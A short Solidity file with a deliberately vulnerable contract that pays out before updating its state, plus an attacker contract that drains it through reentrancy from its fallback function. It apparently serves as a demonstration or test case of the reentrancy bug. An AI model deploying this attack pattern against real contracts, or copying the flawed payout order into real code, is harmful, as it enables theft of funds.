pragma solidity ^0.6.10;


contract reenterVictim {

  address payable attacker;
  bool hasPayed;


  constructor() payable public {
    hasPayed =false;
  }

  function doBet(address payable _a) public {
    attacker = _a;
  }


  function payBet() payable external {
      if (! hasPayed) {
          attacker.call{value: 1}("");
          hasPayed = true;
        }
      }
}



contract reenterAttacker {
  reenterVictim vit;

  constructor(address _v) payable public {
    vit = reenterVictim(_v);
  }


  function startAttack() public {
    vit.payBet();
  }


  fallback() payable external{
    if (address(msg.sender).balance>0) {
      startAttack();
    }
  }
}
